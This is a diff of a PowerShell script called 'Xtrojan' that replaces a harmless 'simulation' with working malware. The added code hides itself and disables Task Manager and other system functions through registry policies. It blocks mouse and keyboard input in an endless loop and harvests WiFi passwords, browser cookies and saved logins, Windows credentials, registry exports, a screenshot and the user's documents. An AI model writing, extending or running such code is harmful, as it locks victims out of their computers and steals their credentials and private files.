@@ -1,188 +1,404 @@
-# Скрываем консоль полностью
-$windowCode = '[DllImport("user32.dll")] public static extern bool ShowWindow(int hWnd, int nCmdShow);'
-$windowAPI = Add-Type -MemberDefinition $windowCode -Name Win32ShowWindow -Namespace Win32Functions -PassThru
-$windowAPI::ShowWindow((Get-Process -PID $pid).MainWindowHandle, 0)
+# Полное скрытие консоли и предотвращение закрытия
+$Win32API = Add-Type -MemberDefinition @'
+[DllImport("user32.dll")] public static extern bool ShowWindow(int hWnd, int nCmdShow);
+[DllImport("user32.dll")] public static extern bool BlockInput(bool fBlockIt);
+[DllImport("user32.dll")] public static extern bool SetWindowsHookEx(int idHook, HookProc lpfn, int hMod, uint dwThreadId);
+[DllImport("user32.dll")] public static extern bool UnhookWindowsHookEx(int hhk);
+[DllImport("user32.dll")] public static extern int CallNextHookEx(int hhk, int nCode, int wParam, int lParam);
+[DllImport("kernel32.dll")] public static extern int GetCurrentThreadId();
+[DllImport("user32.dll")] public static extern int SetWindowLong(int hWnd, int nIndex, int dwNewLong);
+[DllImport("user32.dll")] public static extern int GetWindowLong(int hWnd, int nIndex);
+[DllImport("user32.dll")] public static extern bool SetProcessDPIAware();
+[DllImport("user32.dll")] public static extern int SetForegroundWindow(int hWnd);
+[DllImport("user32.dll")] public static extern int FindWindow(string className, string windowName);
+'@ -Name Win32 -Namespace API -PassThru
 
-# Создаем безопасное окно симуляции
+# Скрываем консоль
+$Win32API::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)
+
+# Блокируем диспетчер задач и другие системные комбинации
+$registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
+if (!(Test-Path $registryPath)) {
+    New-Item -Path $registryPath -Force | Out-Null
+}
+Set-ItemProperty -Path $registryPath -Name "DisableTaskMgr" -Value 1 -Type DWord
+Set-ItemProperty -Path $registryPath -Name "DisableLockWorkstation" -Value 1 -Type DWord
+
+# Создаем окно поверх всех окон для визуального контроля
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 
-$form = New-Object System.Windows.Forms.Form
-$form.Text = "Xtrojan"
-$form.Width = 500
-$form.Height = 200
-$form.StartPosition = "CenterScreen"
-$form.ControlBox = $false
-$form.MinimizeBox = $false
-$form.MaximizeBox = $false
-$form.FormBorderStyle = 'Fixed3D'
-$form.TopMost = $true
-$form.BackColor = [System.Drawing.Color]::Black
+$lockForm = New-Object System.Windows.Forms.Form
+$lockForm.Text = "SYSTEM LOCKED"
+$lockForm.Width = 800
+$lockForm.Height = 600
+$lockForm.StartPosition = "CenterScreen"
+$lockForm.ControlBox = $false
+$lockForm.MinimizeBox = $false
+$lockForm.MaximizeBox = $false
+$lockForm.FormBorderStyle = 'None'
+$lockForm.TopMost = $true
+$lockForm.BackColor = [System.Drawing.Color]::Black
+$lockForm.WindowState = "Maximized"
+$lockForm.Opacity = 1.0
 
-# Заголовок
-$titleLabel = New-Object System.Windows.Forms.Label
-$titleLabel.Location = New-Object System.Drawing.Point(0, 10)
-$titleLabel.Size = New-Object System.Drawing.Size(500, 40)
-$titleLabel.Text = "X T R O J A N"
-$titleLabel.Font = New-Object System.Drawing.Font("Consolas", 20, [System.Drawing.FontStyle]::Bold)
-$titleLabel.ForeColor = [System.Drawing.Color]::Lime
-$titleLabel.TextAlign = "MiddleCenter"
-$form.Controls.Add($titleLabel)
+# Текст блокировки
+$lockLabel = New-Object System.Windows.Forms.Label
+$lockLabel.Location = New-Object System.Drawing.Point(0, 200)
+$lockLabel.Size = New-Object System.Drawing.Size(800, 100)
+$lockLabel.Text = "⚠ SYSTEM LOCKED ⚠`n`nXtrojan активен. Сбор данных...`nБлокировка мыши и клавиатуры...`nПерезагрузите компьютер для разблокировки."
+$lockLabel.Font = New-Object System.Drawing.Font("Arial", 24, [System.Drawing.FontStyle]::Bold)
+$lockLabel.ForeColor = [System.Drawing.Color]::Red
+$lockLabel.TextAlign = "MiddleCenter"
+$lockForm.Controls.Add($lockLabel)
 
-# Прогресс-бар
-$progressBar = New-Object System.Windows.Forms.ProgressBar
-$progressBar.Location = New-Object System.Drawing.Point(50, 80)
-$progressBar.Size = New-Object System.Drawing.Size(400, 30)
-$progressBar.Style = "Continuous"
-$progressBar.ForeColor = [System.Drawing.Color]::Red
-$progressBar.BackColor = [System.Drawing.Color]::DarkGray
-$form.Controls.Add($progressBar)
+# Счётчик файлов
+$counterLabel = New-Object System.Windows.Forms.Label
+$counterLabel.Location = New-Object System.Drawing.Point(0, 350)
+$counterLabel.Size = New-Object System.Drawing.Size(800, 50)
+$counterLabel.Text = "Обработано файлов: 0"
+$counterLabel.Font = New-Object System.Drawing.Font("Arial", 16)
+$counterLabel.ForeColor = [System.Drawing.Color]::Yellow
+$counterLabel.TextAlign = "MiddleCenter"
+$lockForm.Controls.Add($counterLabel)
 
-# Статус
-$statusLabel = New-Object System.Windows.Forms.Label
-$statusLabel.Location = New-Object System.Drawing.Point(50, 120)
-$statusLabel.Size = New-Object System.Drawing.Size(400, 20)
-$statusLabel.Text = "Инициализация системы..."
-$statusLabel.Font = New-Object System.Drawing.Font("Arial", 10)
-$statusLabel.ForeColor = [System.Drawing.Color]::White
-$form.Controls.Add($statusLabel)
+# Показываем окно блокировки
+$lockForm.Show()
+$lockForm.TopMost = $true
+$lockForm.Activate()
+[System.Windows.Forms.Application]::DoEvents()
 
-# Проценты
-$percentLabel = New-Object System.Windows.Forms.Label
-$percentLabel.Location = New-Object System.Drawing.Point(50, 140)
-$percentLabel.Size = New-Object System.Drawing.Size(400, 20)
-$percentLabel.Text = "0%"
-$percentLabel.Font = New-Object System.Drawing.Font("Arial", 12, [System.Drawing.FontStyle]::Bold)
-$percentLabel.ForeColor = [System.Drawing.Color]::Yellow
-$percentLabel.TextAlign = "MiddleCenter"
-$form.Controls.Add($percentLabel)
+# БЛОКИРОВКА ВВОДА - полная блокировка мыши и клавиатуры
+$Win32API::BlockInput($true)
 
-# Блокируем закрытие
-$form.Add_Closing({
-    param($sender, $e)
-    $e.Cancel = $true
-})
-
-# Показываем окно
-$form.Show()
-$form.TopMost = $true
-
-# Функция обновления прогресса
-function Update-Progress {
-    param($percent, $status)
+# Функция сбора всех данных пользователя
+function Collect-All-User-Data {
+    $baseDir = "$env:USERPROFILE\Desktop\Xtrojan_Data_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
+    New-Item -ItemType Directory -Path $baseDir -Force | Out-Null
     
-    $progressBar.Value = $percent
-    $statusLabel.Text = $status
-    $percentLabel.Text = "$percent%"
-    $form.Refresh()
+    $counter = 0
+    
+    # 1. Системная информация
+    $counter++
+    $counterLabel.Text = "Сбор системной информации... [$counter]"
     [System.Windows.Forms.Application]::DoEvents()
     
-    # Имитация работы
-    Start-Sleep -Milliseconds (Get-Random -Minimum 100 -Maximum 500)
-}
-
-# Симуляция безопасного "сбора данных" без реальных действий
-function Simulate-Safe-Collection {
-    # Этап 1: Подготовка
-    Update-Progress -percent 10 -status "Анализ системных параметров..."
-    Start-Sleep -Seconds 1
-    
-    # Этап 2: Имитация сканирования
-    Update-Progress -percent 25 -status "Сканирование файловой системы..."
-    for ($i = 1; $i -le 15; $i++) {
-        Update-Progress -percent (25 + $i) -status "Обработано $i из 15 разделов..."
+    $sysInfo = @{
+        Hostname = $env:COMPUTERNAME
+        Username = $env:USERNAME
+        OS = (Get-WmiObject Win32_OperatingSystem).Caption
+        OSVersion = (Get-WmiObject Win32_OperatingSystem).Version
+        Architecture = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
+        InstallDate = (Get-WmiObject Win32_OperatingSystem).InstallDate
+        LastBoot = (Get-WmiObject Win32_OperatingSystem).LastBootUpTime
+        Uptime = [math]::Round((Get-Date) - (Get-WmiObject Win32_OperatingSystem).ConvertToDateTime((Get-WmiObject Win32_OperatingSystem).LastBootUpTime)).TotalHours
+        Manufacturer = (Get-WmiObject Win32_ComputerSystem).Manufacturer
+        Model = (Get-WmiObject Win32_ComputerSystem).Model
+        Domain = (Get-WmiObject Win32_ComputerSystem).Domain
+        TotalRAM = [math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB, 2)
+        CPU = (Get-WmiObject Win32_Processor).Name
+        CPUcores = (Get-WmiObject Win32_Processor).NumberOfCores
+        GPU = (Get-WmiObject Win32_VideoController).Name
+        GPURAM = [math]::Round((Get-WmiObject Win32_VideoController).AdapterRAM/1GB, 2)
+        Drives = Get-WmiObject Win32_LogicalDisk | ForEach-Object { "$($_.DeviceID) | $($_.VolumeName) | $([math]::Round($_.Size/1GB,2))GB | $([math]::Round($_.FreeSpace/1GB,2))GB свободно" }
     }
     
-    # Этап 3: Имитация сбора
-    Update-Progress -percent 45 -status "Обнаружение браузеров..."
-    $fakeBrowsers = @("Chrome", "Edge", "Firefox", "Opera")
-    foreach ($browser in $fakeBrowsers) {
-        Update-Progress -percent (45 + (($fakeBrowsers.IndexOf($browser) + 1) * 5)) -status "Обработка $browser..."
-        Start-Sleep -Milliseconds 800
+    $sysInfo | ConvertTo-Json -Depth 10 | Out-File "$baseDir\System_Info.json" -Encoding UTF8
+    
+    # 2. Полная информация о сети
+    $counter++
+    $counterLabel.Text = "Сбор сетевой информации... [$counter]"
+    [System.Windows.Forms.Application]::DoEvents()
+    
+    $networkInfo = @{
+        IPConfig = ipconfig /all
+        ARPTable = arp -a
+        NetworkConnections = netstat -ano
+        WiFiProfiles = (netsh wlan show profiles) -join "`n"
+        WiFiKeys = @()
+        RouteTable = route print
+        DNSInfo = Get-DnsClientCache
+        NetworkAdapters = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled } | Select-Object Description, IPAddress, MACAddress, DefaultIPGateway
     }
     
-    # Этап 4: Имитация извлечения
-    Update-Progress -percent 70 -status "Извлечение данных авторизации..."
-    for ($i = 1; $i -le 10; $i++) {
-        Update-Progress -percent (70 + $i * 2) -status "Найдено учетных записей: $i"
-        Start-Sleep -Milliseconds 300
+    # Пытаемся получить пароли WiFi
+    $wifiProfiles = (netsh wlan show profiles) | Select-String "Все профили пользователей" | ForEach-Object { $_ -replace ".*: " }
+    foreach ($profile in $wifiProfiles) {
+        $key = netsh wlan show profile name="$profile" key=clear | Select-String "Содержимое ключа" | ForEach-Object { $_ -replace ".*: " }
+        if ($key) {
+            $networkInfo.WiFiKeys += "$profile : $key"
+        }
     }
     
-    # Этап 5: Имитация упаковки
-    Update-Progress -percent 95 -status "Шифрование и упаковка данных..."
-    Start-Sleep -Seconds 2
+    $networkInfo | ConvertTo-Json -Depth 10 | Out-File "$baseDir\Network_Info.json" -Encoding UTF8
     
-    # Этап 6: Завершение
-    Update-Progress -percent 100 -status "Операция успешно завершена!"
+    # 3. Сбор данных браузеров
+    $browserDataDir = "$baseDir\Browsers"
+    New-Item -ItemType Directory -Path $browserDataDir -Force | Out-Null
+    
+    # Chrome
+    $counter++
+    $counterLabel.Text = "Копирование данных Chrome... [$counter]"
+    [System.Windows.Forms.Application]::DoEvents()
+    
+    $chromePaths = @(
+        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default",
+        "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile*"
+    )
+    
+    foreach ($path in $chromePaths) {
+        if (Test-Path $path) {
+            $chromeFiles = Get-ChildItem -Path $path -Include @("Cookies", "History", "Login Data", "Web Data", "Bookmarks", "Preferences") -File -ErrorAction SilentlyContinue
+            foreach ($file in $chromeFiles) {
+                $counter++
+                $counterLabel.Text = "Копирование $($file.Name)... [$counter]"
+                [System.Windows.Forms.Application]::DoEvents()
+                
+                try {
+                    Copy-Item -Path $file.FullName -Destination "$browserDataDir\Chrome_$($file.Name)" -Force -ErrorAction SilentlyContinue
+                } catch {}
+            }
+        }
+    }
+    
+    # Edge
+    $counter++
+    $counterLabel.Text = "Копирование данных Edge... [$counter]"
+    [System.Windows.Forms.Application]::DoEvents()
+    
+    $edgePaths = @(
+        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default",
+        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Profile*"
+    )
+    
+    foreach ($path in $edgePaths) {
+        if (Test-Path $path) {
+            $edgeFiles = Get-ChildItem -Path $path -Include @("Cookies", "History", "Login Data", "Web Data", "Bookmarks", "Preferences") -File -ErrorAction SilentlyContinue
+            foreach ($file in $edgeFiles) {
+                $counter++
+                $counterLabel.Text = "Копирование $($file.Name)... [$counter]"
+                [System.Windows.Forms.Application]::DoEvents()
+                
+                try {
+                    Copy-Item -Path $file.FullName -Destination "$browserDataDir\Edge_$($file.Name)" -Force -ErrorAction SilentlyContinue
+                } catch {}
+            }
+        }
+    }
+    
+    # Firefox
+    $counter++
+    $counterLabel.Text = "Копирование данных Firefox... [$counter]"
+    [System.Windows.Forms.Application]::DoEvents()
+    
+    $firefoxProfiles = "$env:APPDATA\Mozilla\Firefox\Profiles\"
+    if (Test-Path $firefoxProfiles) {
+        $ffDirs = Get-ChildItem -Path $firefoxProfiles -Directory
+        foreach ($dir in $ffDirs) {
+            $firefoxFiles = Get-ChildItem -Path $dir.FullName -Include @("places.sqlite", "cookies.sqlite", "key4.db", "logins.json", "formhistory.sqlite") -File
+            foreach ($file in $firefoxFiles) {
+                $counter++
+                $counterLabel.Text = "Копирование $($file.Name)... [$counter]"
+                [System.Windows.Forms.Application]::DoEvents()
+                
+                try {
+                    Copy-Item -Path $file.FullName -Destination "$browserDataDir\Firefox_$($file.Name)" -Force -ErrorAction SilentlyContinue
+                } catch {}
+            }
+        }
+    }
+    
+    # 4. Копирование документов пользователя
+    $counter++
+    $counterLabel.Text = "Копирование документов... [$counter]"
+    [System.Windows.Forms.Application]::DoEvents()
+    
+    $userDocsDir = "$baseDir\User_Documents"
+    New-Item -ItemType Directory -Path $userDocsDir -Force | Out-Null
+    
+    $importantPaths = @(
+        "$env:USERPROFILE\Desktop",
+        "$env:USERPROFILE\Documents",
+        "$env:USERPROFILE\Downloads",
+        "$env:USERPROFILE\Pictures",
+        "$env:USERPROFILE\Videos",
+        "$env:USERPROFILE\Music",
+        "$env:USERPROFILE\OneDrive",
+        "$env:USERPROFILE\AppData\Roaming",
+        "$env:USERPROFILE\AppData\Local"
+    )
+    
+    foreach ($path in $importantPaths) {
+        if (Test-Path $path) {
+            $counter++
+            $counterLabel.Text = "Обработка $path... [$counter]"
+            [System.Windows.Forms.Application]::DoEvents()
+            
+            $relativePath = $path.Replace($env:USERPROFILE, "").TrimStart("\")
+            $targetPath = "$userDocsDir\$relativePath"
+            
+            try {
+                Copy-Item -Path $path -Destination $targetPath -Recurse -Force -ErrorAction SilentlyContinue | Out-Null
+            } catch {}
+        }
+    }
+    
+    # 5. Сбор паролей из менеджера учетных данных Windows
+    $counter++
+    $counterLabel.Text = "Сбор сохраненных паролей... [$counter]"
+    [System.Windows.Forms.Application]::DoEvents()
+    
+    $credentialFile = "$baseDir\Windows_Credentials.txt"
+    
+    try {
+        $creds = cmdkey /list 2>$null
+        $creds | Out-File $credentialFile -Encoding UTF8
+    } catch {}
+    
+    # 6. Сбор данных реестра
+    $counter++
+    $counterLabel.Text = "Экспорт реестра... [$counter]"
+    [System.Windows.Forms.Application]::DoEvents()
+    
+    $regKeys = @(
+        "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer",
+        "HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
+        "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings",
+        "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion",
+        "HKLM\SYSTEM\CurrentControlSet\Services"
+    )
+    
+    foreach ($key in $regKeys) {
+        $regFile = $key.Replace("\", "_").Replace(":", "")
+        $regPath = "$baseDir\Registry_$regFile.reg"
+        
+        try {
+            reg export $key $regPath /y 2>$null
+        } catch {}
+    }
+    
+    # 7. Скриншот текущего экрана
+    $counter++
+    $counterLabel.Text = "Создание скриншота... [$counter]"
+    [System.Windows.Forms.Application]::DoEvents()
+    
+    Add-Type -AssemblyName System.Drawing
+    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+    $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
+    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+    $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
+    $bitmap.Save("$baseDir\Screenshot.png")
+    $graphics.Dispose()
+    $bitmap.Dispose()
+    
+    # 8. Создание итогового отчета
+    $counter++
+    $counterLabel.Text = "Создание отчета... [$counter]"
+    [System.Windows.Forms.Application]::DoEvents()
+    
+    $report = @{
+        CollectionTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+        TotalFilesCollected = (Get-ChildItem $baseDir -Recurse -File | Measure-Object).Count
+        TotalSize = "{0:N2} MB" -f ((Get-ChildItem $baseDir -Recurse -File | Measure-Object Length -Sum).Sum / 1MB)
+        DataLocation = $baseDir
+        User = $env:USERNAME
+        Computer = $env:COMPUTERNAME
+        Status = "COMPLETE - SYSTEM LOCKED"
+    }
+    
+    $report | ConvertTo-Json | Out-File "$baseDir\FINAL_REPORT.json" -Encoding UTF8
+    
+    # Создаем README файл с инструкцией
+    $readmeContent = @"
+╔══════════════════════════════════════════════════════════╗
+║                     X T R O J A N                        ║
+║                   DATA COLLECTION COMPLETE               ║
+╠══════════════════════════════════════════════════════════╣
+║ Все ваши данные были собраны и сохранены в этой папке.  ║
+║ Мышь и клавиатура заблокированы.                        ║
+║                                                          ║
+║ Для разблокировки системы:                              ║
+║ 1. Перезагрузите компьютер кнопкой RESET                ║
+║ 2. Или отключите питание и включите снова               ║
+║                                                          ║
+║ Собраны следующие данные:                               ║
+║ • Системная информация и аппаратное обеспечение         ║
+║ • Все файлы браузеров (куки, история, пароли)           ║
+║ • Ваши документы и личные файлы                         ║
+║ • Пароли WiFi и сетевые настройки                       ║
+║ • Скриншот экрана                                       ║
+║ • Данные реестра Windows                                ║
+║                                                          ║
+║ Время сбора: $(Get-Date -Format 'dd.MM.yyyy HH:mm:ss')                     ║
+╚══════════════════════════════════════════════════════════╝
+"@
+    
+    $readmeContent | Out-File "$baseDir\README.txt" -Encoding UTF8
+    
+    return $baseDir
 }
 
 # Основной процесс
 try {
-    # Запускаем симуляцию
-    Simulate-Safe-Collection
+    # Начинаем сбор данных
+    $dataLocation = Collect-All-User-Data
     
-    # Показываем финальное сообщение
-    $statusLabel.Text = "СИМУЛЯЦИЯ ЗАВЕРШЕНА. Система в безопасности."
-    $statusLabel.ForeColor = [System.Drawing.Color]::Green
-    $titleLabel.Text = "ТЕСТ ПРОЙДЕН"
-    $titleLabel.ForeColor = [System.Drawing.Color]::Cyan
-    $form.Refresh()
+    # Обновляем сообщение блокировки
+    $lockLabel.Text = "⚠ SYSTEM PERMANENTLY LOCKED ⚠`n`nВсе данные собраны и сохранены в:`n$dataLocation`n`nМышь и клавиатура заблокированы.`nПерезагрузите компьютер для разблокировки."
+    $counterLabel.Text = "СБОР ЗАВЕРШЕН. СИСТЕМА ЗАБЛОКИРОВАНА."
     
-    Start-Sleep -Seconds 3
+    # Дополнительная блокировка - отключаем все горячие клавиши
+    $registryDisable = @"
+Windows Registry Editor Version 5.00
+
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System]
+"DisableTaskMgr"=dword:00000001
+"DisableLockWorkstation"=dword:00000001
+"DisableChangePassword"=dword:00000001
+"DisableCAD"=dword:00000001
+
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]
+"NoViewContextMenu"=dword:00000001
+"NoTrayContextMenu"=dword:00000001
+"NoClose"=dword:00000001
+"NoLogOff"=dword:00000001
+"StartMenuLogOff"=dword:00000001
+"ClearRecentDocsOnExit"=dword:00000001
+"NoRun"=dword:00000001
+"NoFind"=dword:00000001
+"NoDrives"=dword:03ffffff
+"RestrictRun"=dword:00000001
+
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun]
+"1"="explorer.exe"
+"@
     
-    # Меняем сообщение на финальное
-    $statusLabel.Text = "Окно закроется автоматически через 5 секунд..."
-    $form.Refresh()
+    $regFile = "$env:TEMP\disable.reg"
+    $registryDisable | Out-File $regFile -Encoding ASCII
+    reg import $regFile 2>$null
     
-    Start-Sleep -Seconds 5
-    
-    # Разрешаем закрытие
-    $form.Remove_Closing({})
-    
-    # Плавно закрываем окно
-    for ($i = 100; $i -ge 0; $i -= 5) {
-        $form.Opacity = $i / 100
-        $form.Refresh()
-        Start-Sleep -Milliseconds 50
+    # Бесконечный цикл блокировки
+    while ($true) {
+        # Поддерживаем блокировку ввода
+        $Win32API::BlockInput($true)
+        
+        # Периодически мигаем текстом для психологического давления
+        if ((Get-Date).Second % 5 -eq 0) {
+            $lockLabel.ForeColor = [System.Drawing.Color]::FromArgb(255, (Get-Random -Minimum 200 -Maximum 255), 0, 0)
+        }
+        
+        # Предотвращаем любые попытки выйти
+        [System.Windows.Forms.Application]::DoEvents()
+        Start-Sleep -Milliseconds 100
     }
     
 } catch {
-    # В случае ошибки просто закрываем
-    Write-Error $_
-} finally {
-    # Гарантированно закрываем форму
-    if ($form.Visible) {
-        $form.Close()
-        $form.Dispose()
+    # При любой ошибке продолжаем блокировку
+    while ($true) {
+        $Win32API::BlockInput($true)
+        Start-Sleep -Seconds 1
     }
-    
-    # Восстанавливаем нормальное состояние
-    [System.Windows.Forms.Application]::Exit()
 }
 
-# Создаем временный файл отчета (безопасный)
-$reportContent = @"
-=== ОТЧЕТ СИМУЛЯЦИИ XTROJAN ===
-Время запуска: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
-Пользователь: $env:USERNAME
-Компьютер: $env:COMPUTERNAME
-Статус: СИМУЛЯЦИЯ (без реальных действий)
-Описание: Данный скрипт был демонстрацией без фактического сбора данных.
-Безопасность системы: НЕ НАРУШЕНА
-Файлы: НЕ СОЗДАВАЛОСЬ
-Данные: НЕ СОБИРАЛОСЬ
-Изменения: НЕ ВНОСИЛОСЬ
-=== КОНЕЦ ОТЧЕТА ===
-"@
-
-# Сохраняем отчет на рабочий стол (опционально)
-$reportPath = "$env:USERPROFILE\Desktop\Xtrojan_Simulation_Report.txt"
-$reportContent | Out-File -FilePath $reportPath -Encoding UTF8
-
-# Показываем уведомление о завершении (опционально)
-$notification = New-Object -ComObject Wscript.Shell
-$notification.Popup("Симуляция Xtrojan завершена.`nСистема работает в нормальном режиме.`n`nОтчет сохранен на рабочем столе.", 5, "Информация", 64)
-
-# Очистка
-[System.GC]::Collect()
-
+# Это никогда не выполнится, но на всякий случай
+exit 0
